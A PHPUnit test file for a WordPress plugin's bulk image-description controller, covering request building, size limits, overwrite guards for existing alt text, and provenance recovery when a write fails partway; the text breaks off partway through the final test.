<?php

declare(strict_types=1);

namespace AltContext\Tests\Unit;

use AltContext\Api\AltTextWriteStatus;
use AltContext\Api\DescribeController;
use AltContext\Tests\TestCase;
use WP_REST_Request;

use function glob;
use function is_dir;
use function json_decode;
use function mkdir;
use function rmdir;
use function sys_get_temp_dir;
use function uniqid;
use function unlink;

/**
 * @covers \AltContext\Api\DescribeController
 */
class DescribeRunControllerTest extends TestCase
{
    private DescribeController $controller;
    private string $tempDir;

    protected function setUp(): void
    {
        parent::setUp();
        // Option-write harness state is not cleared by the base TestCase; reset
        // here so a forced-failure test cannot leak into later submits.
        $GLOBALS['__ac_update_option_fail'] = [];
        $GLOBALS['__ac_update_option_calls'] = [];
        $GLOBALS['__ac_option_autoload'] = [];
        $this->setOption('acx_recognition_url', 'http://localhost:8000');
        $this->setOption('acx_recognition_api_key', 'test-key');
        $this->controller = new DescribeController();
        $this->tempDir = sys_get_temp_dir() . '/acx-wbux-3-' . uniqid();
        mkdir($this->tempDir, 0o755, true);
    }

    protected function tearDown(): void
    {
        if (is_dir($this->tempDir)) {
            foreach (glob($this->tempDir . '/*') as $f) {
                @unlink($f);
            }
            @rmdir($this->tempDir);
        }
        parent::tearDown();
    }

    private function plantAttachment(int $id, string $bytes, string $extension = 'jpg'): string
    {
        $path = $this->tempDir . "/{$id}.{$extension}";
        file_put_contents($path, $bytes);
        $GLOBALS['__ac_attached_file'][$id] = $path;
        return $path;
    }

    public function testSubmitBulkDescribeRunSendsMultipartWithImageParts(): void
    {
        $bytes101 = "\xff\xd8\xff\xe0jpeg-101";
        $bytes202 = "\x89PNG\r\n\x1a\npng-202";
        $this->plantAttachment(101, $bytes101, 'jpg');
        $this->plantAttachment(202, $bytes202, 'png');

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => '{"run_id":"11111111-1111-1111-1111-111111111111","status":"pending","phase":"queued","completed":0,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $call = $this->getHttpCalls()[0];
        $this->assertStringContainsString('/scene/describe/run', $call['url']);
        $this->assertSame('POST', $call['method']);

        // request_class 'description' → 180s timeout, no breaker (large/slow bulk upload).
        $this->assertSame(180, $call['args']['timeout']);

        // multipart/form-data body with a boundary Content-Type.
        $this->assertStringContainsString('multipart/form-data; boundary=', (string) $call['args']['headers']['Content-Type']);

        $body = (string) $call['args']['body'];

        // Form field `tenant_id`.
        $this->assertStringContainsString('name="tenant_id"', $body);
        $this->assertStringContainsString(self::currentTenantId(), $body);

        // Form field `media_ids` = JSON int array as string.
        $this->assertStringContainsString('name="media_ids"', $body);
        $this->assertStringContainsString('[101,202]', $body);

        // HARM-F1: default ON (option absent) forwards recognition_enabled=true.
        $this->assertMatchesRegularExpression(
            '/name="recognition_enabled"\r\n\r\ntrue\r\n/',
            $body
        );

        // One `image_<media_id>` file part per id, carrying the raw bytes.
        $this->assertStringContainsString('name="image_101"; filename="101.jpg"', $body);
        $this->assertStringContainsString('Content-Type: image/jpeg', $body);
        $this->assertStringContainsString($bytes101, $body);
        $this->assertStringContainsString('name="image_202"; filename="202.png"', $body);
        $this->assertStringContainsString('Content-Type: image/png', $body);
        $this->assertStringContainsString($bytes202, $body);

        // BR-129 / BR-134: successful submit records the media_id set for later apply.
        $stored = get_option('acx_describe_run_media_ids_11111111-1111-1111-1111-111111111111');
        $this->assertIsArray($stored);
        $this->assertSame([101, 202], $stored['media_ids'] ?? null);
        $this->assertArrayHasKey('created_at', $stored);
    }

    public function testSubmitForwardsRecognitionEnabledFalseWhenOptionOff(): void
    {
        $this->setOption('acx_recognition_enabled', '0');
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => '{"run_id":"11111111-1111-1111-1111-111111111111","status":"pending","phase":"queued","completed":0,"failed":0,"skipped":0,"total":1,"cancel_requested":false,"gpu_state":null}',
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $body = (string) $this->getHttpCalls()[0]['args']['body'];
        $this->assertMatchesRegularExpression(
            '/name="recognition_enabled"\r\n\r\nfalse\r\n/',
            $body
        );
    }

    public function testSubmitRejectsMoreThan200MediaIds(): void
    {
        $mediaIds = range(1, 201);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', $mediaIds);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('too_many_media_ids', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        // No silent truncation → no backend dispatch.
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testSubmitRejectsUnreadableAttachmentNamingTheId(): void
    {
        // 101 is readable; 202 has no planted file → load fails, run is rejected.
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_attachment_unreadable', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        $this->assertStringContainsString('202', $response->get_error_message());
        // Fail fast before dispatching a partial run.
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testSubmitRejectsEmptyMediaIds(): void
    {
        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', []);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('missing_media_ids', $response->get_error_code());
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testStatusAndCancelProxyToSceneRunEndpoint(): void
    {
        $runId = '22222222-2222-2222-2222-222222222222';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => '{"run_id":"' . $runId . '","status":"running","phase":"describing","completed":1,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => '{"run_id":"' . $runId . '","status":"cancelled","phase":"cancelled","completed":1,"failed":0,"skipped":1,"total":2,"cancel_requested":true,"gpu_state":null}',
        ]);

        $statusRequest = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId);
        $statusRequest->set_param('run_id', $runId);
        $cancelRequest = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/cancel');
        $cancelRequest->set_param('run_id', $runId);

        $this->controller->get_describe_run_status($statusRequest);
        $this->controller->cancel_describe_run($cancelRequest);

        $calls = $this->getHttpCalls();
        $this->assertStringContainsString('/scene/describe/run/' . $runId, $calls[0]['url']);
        $this->assertSame('GET', $calls[0]['args']['method']);
        // Status polling uses 'post_scan_read' (10s, no breaker) so it never trips
        // the shared recognition circuit breaker during a long run. (PHP-02)
        $this->assertSame(10, $calls[0]['args']['timeout']);
        $this->assertStringContainsString('/scene/describe/run/' . $runId, $calls[1]['url']);
        $this->assertSame('DELETE', $calls[1]['args']['method']);
    }

    public function testSubmitDeduplicatesMediaIdsPreservingFirstSeenOrder(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $this->plantAttachment(202, "\x89PNG\r\n\x1a\npng-202", 'png');

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => '{"run_id":"11111111-1111-1111-1111-111111111111","status":"pending","phase":"queued","completed":0,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202, 101, 202, 101]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $body = (string) $this->getHttpCalls()[0]['args']['body'];
        // Distinct, first-seen order preserved; no redundant inference.
        $this->assertStringContainsString('[101,202]', $body);
        $this->assertSame(1, substr_count($body, 'name="image_101"'));
        $this->assertSame(1, substr_count($body, 'name="image_202"'));
    }

    public function testSubmitRejectsRunExceedingBodyCapWith413(): void
    {
        // Shrink the aggregate cap so a small planted file overflows it, without
        // materializing hundreds of MB of test bytes. (PHP-01 / PHP-03)
        add_filter('acx_describe_run_max_body_bytes', static fn (): int => 8);
        $this->plantAttachment(101, 'too-many-bytes-here', 'jpg');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_payload_too_large', $response->get_error_code());
        $this->assertSame(413, $response->get_error_data()['status'] ?? null);
        $this->assertStringContainsString('101', $response->get_error_message());
        // Rejected before any backend dispatch (and before OOM-buffering).
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testMaxItemsCapIsFilterable(): void
    {
        // Operators align the WP cap with the backend ACX_DESCRIBE_RUN_MAX_ITEMS. (PHP-03)
        add_filter('acx_describe_run_max_items', static fn (): int => 2);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [1, 2, 3]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('too_many_media_ids', $response->get_error_code());
        $this->assertStringContainsString('2 media IDs', $response->get_error_message());
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testGetDescribeRunItemsProxiesAndAnnotatesExistingAlt(): void
    {
        // WBUX-4 INT-01b: media 70 already has operator alt text; 71 does not.
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');

        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a cat on a sofa', 'caption' => 'cat', 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => null],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        // Read-class proxy: post_scan_read (10s, no shared breaker) like status.
        $call = $this->getHttpCalls()[0];
        $this->assertStringContainsString('/scene/describe/run/' . $runId . '/items', $call['url']);
        $this->assertSame('GET', $call['args']['method']);

        $data = $response->get_data();
        $items = [];
        foreach ($data['items'] as $item) {
            $items[$item['media_id']] = $item;
        }
        // existing_alt bucketing is computed in WP from post meta, not the backend.
        $this->assertTrue($items[70]['existing_alt']);
        $this->assertFalse($items[71]['existing_alt']);
        // Draft passthrough is preserved unchanged.
        $this->assertSame('a cat on a sofa', $items[70]['alt_text_draft']);
        $this->assertSame('a dog in a park', $items[71]['alt_text_draft']);
    }

    public function testGetDescribeRunItemsRequiresRunId(): void
    {
        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs//items');
        $request->set_param('run_id', '');
        $response = $this->controller->get_describe_run_items($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
    }

    private function plantPostType(int $id, string $type = 'attachment'): void
    {
        $GLOBALS['__ac_posts'][$id] = (object) ['ID' => $id, 'post_type' => $type];
    }

    /**
     * BR-129 / BR-134: plant the WP-side submitted media_id set that apply intersects against.
     *
     * @param int[] $mediaIds
     */
    private function plantSubmittedMediaIds(string $runId, array $mediaIds, ?int $createdAt = null): void
    {
        update_option(
            'acx_describe_run_media_ids_' . $runId,
            [
                'media_ids' => array_values($mediaIds),
                'created_at' => $createdAt ?? time(),
            ],
            false
        );
        $index = get_option('acx_describe_run_media_ids_index', []);
        if (!is_array($index)) {
            $index = [];
        }
        $index[$runId] = $createdAt ?? time();
        update_option('acx_describe_run_media_ids_index', $index, false);
    }

    private function queueRunStatusResponse(string $runId, string $status = 'completed'): void
    {
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'status' => $status,
                'phase' => 'complete',
                'completed' => 2,
                'failed' => 0,
                'skipped' => 1,
                'total' => 3,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);
    }

    private function queueRunItemsResponse(string $runId): void
    {
        // media 70: has draft, WILL have existing alt planted by the test.
        // media 71: has draft, no existing alt (safe auto-apply).
        // media 72: failed item, no draft.
        $this->plantSubmittedMediaIds($runId, [70, 71, 72]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a cat on a sofa', 'caption' => 'cat', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 72, 'status' => 'failed', 'alt_text_draft' => null, 'caption' => null, 'provenance' => null],
                ],
            ]),
        ]);
    }

    public function testApplyRunDraftsAutoAppliesEmptyAltAndGuardsExisting(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        // No overwrite list → existing-alt items are guarded.

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['skipped_invalid']);
        $this->assertSame([], $data['failed']);

        // 71 written; 70 NOT clobbered; provenance persisted for the written item.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('human-authored alt', get_post_meta(70, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('florence', $prov['adapter']);
        // S3-06: WP-stamped bulk-apply provenance is injected on the written item.
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertArrayHasKey('applied_at', $prov);
    }

    public function testApplyRunDraftsOverwritesOnlyExplicitlyListedMedia(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        // Happy path: every fully written id is in applied (not partial).
        $this->assertSame([70, 71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);

        // 70 overwritten because it was explicitly listed.
        $this->assertSame('a cat on a sofa', get_post_meta(70, '_wp_attachment_image_alt', true));
    }

    public function testApplyRejectsNonCompletedRunWith409(): void
    {
        // S3-03: an in-flight run must not have its drafts written.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'running');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_not_applicable', $response->get_error_code());
        $this->assertSame(409, $response->get_error_data()['status'] ?? null);
        // Rejected after the status read, before fetching items or writing.
        $this->assertCount(1, $this->getHttpCalls());
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    public function testApplySkipsNonAttachmentMediaId(): void
    {
        // S3-01: 73 carries a valid draft but is NOT an attachment (a post id the
        // backend echoed) — it must never be stamped onto _wp_attachment_image_alt.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(73, 'post');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [73]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 73, 'status' => 'completed', 'alt_text_draft' => 'not an attachment', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([73], $data['skipped_invalid']);
        $this->assertSame([], $data['applied']);
        // Nothing written to the non-attachment id.
        $this->assertSame('', get_post_meta(73, '_wp_attachment_image_alt', true));
    }

    public function testApplyGuardsPerItemAcrossTwoExistingAltItems(): void
    {
        // S3-06: two existing-alt items, only one opted into overwrite → the guard
        // is per-item, not run-wide.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human 70');
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'human 71');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [70, 71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'draft 70', 'caption' => null, 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'draft 71', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();

        $this->assertSame([70], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame('draft 70', get_post_meta(70, '_wp_attachment_image_alt', true));
        $this->assertSame('human 71', get_post_meta(71, '_wp_attachment_image_alt', true));

        // Injected provenance stamped on the written item.
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertArrayHasKey('applied_at', $prov);
        $this->assertSame('florence', $prov['adapter']);
    }

    public function testApplyAllowsCompletedWithErrorsRun(): void
    {
        // D1-01: a partial run (completed_with_errors) is terminal-with-drafts and
        // MUST be applyable — it is not rejected like a still-running run. Proves
        // the 409 gate's ALLOW branch covers partial completions, not just
        // 'completed'.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed_with_errors');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Drafts are written despite the partial-failure run status.
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    public function testApplyRunDraftsBucketsFailedAltWrite(): void
    {
        // D1-02 / S3-02: when the alt-text write returns false AND the stored value
        // does not match the draft (a genuine failure, not a byte-identical no-op),
        // the item lands in `failed`, never `applied`.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71 has a draft and no existing alt → it would normally be applied, but
        // force its alt write to fail (returns false, nothing persisted).
        $GLOBALS['__ac_update_post_meta_fail'][71]['_wp_attachment_image_alt'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertSame([71], $data['failed']);
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        // No provenance stamped on a failed item.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    public function testApplyRunDraftsCountsNoOpWriteAsApplied(): void
    {
        // D1-02 / S3-02: update_post_meta() also returns false for a byte-identical
        // no-op overwrite. The read-back proves the stored value already equals the
        // draft, so the item counts as `applied`, not `failed`.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        // 70's existing alt already equals its draft; opt into overwrite so it
        // reaches the write path, then force the write to return false (no-op).
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'a cat on a sofa');
        $GLOBALS['__ac_update_post_meta_fail'][70]['_wp_attachment_image_alt'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertContains(70, $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['failed']);
        // Provenance is still stamped for a no-op-but-applied item.
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
    }

    /**
     * Provenance write failure after a verified alt must not report the id as
     * fully applied. Mirrors DescriptionHistoryService::record_correction's
     * description_correction_partial contract in multi-item form: alt stays
     * written; telemetry lag is explicit via `partial`. [RLSE-05] [TEST-15]
     */
    public function testApplyRunDraftsBucketsPartialWhenProvenanceWriteFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71: alt write succeeds, provenance write returns false and stores nothing.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Not fully applied — history would skip this id without provenance.
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // Alt landed; provenance did not. Do not imply a total failure.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // BR-82: partial also plants a pending marker scoped to this run+draft.
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);
    }

    /**
     * Partial recovery: after alt lands but provenance fails, a second apply
     * without overwrite_media_ids must complete provenance when the pending
     * marker proves this system started the write for this run+draft.
     * [RLSE-05] [TEST-15]
     */
    public function testApplyRunDraftsRecoversPartialWithoutOverwrite(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // First apply: provenance write fails on 71 → partial + pending marker.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $firstData = $firstResponse->get_data();
        $this->assertSame([], $firstData['applied']);
        $this->assertSame([71], $firstData['partial']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);

        // Clear the forced provenance failure so the retry can succeed.
        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        // Second apply: no overwrite list. Marker + alt===draft + no prov → recover.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        // Explicitly no overwrite_media_ids — recovery must not require opt-in.

        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $this->assertSame(200, $secondResponse->get_status());

        $data = $secondResponse->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // Alt unchanged; provenance now stored so history can list the item.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        // R23-BR-08 / R23-BR-22: same-run recovery is explicit kind, not absent key.
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertArrayHasKey('origin', $prov['recovered_from']);
        $this->assertNull($prov['recovered_from']['origin']);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_SAME_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
        // Marker deleted once provenance verifies.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-82: coincidental alt===draft without a pending marker must stay
     * skipped_existing — equality alone is not evidence this system started the
     * write. Goes RED if the marker gate is removed from the fall-through.
     */
    public function testApplyRunDraftsGuardsCoincidentalAltMatchWithoutPendingMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // Operator (or prior partial-inline) text happens to equal the draft.
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'a dog in a park');
        // No provenance, no pending marker — coincidental match only.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

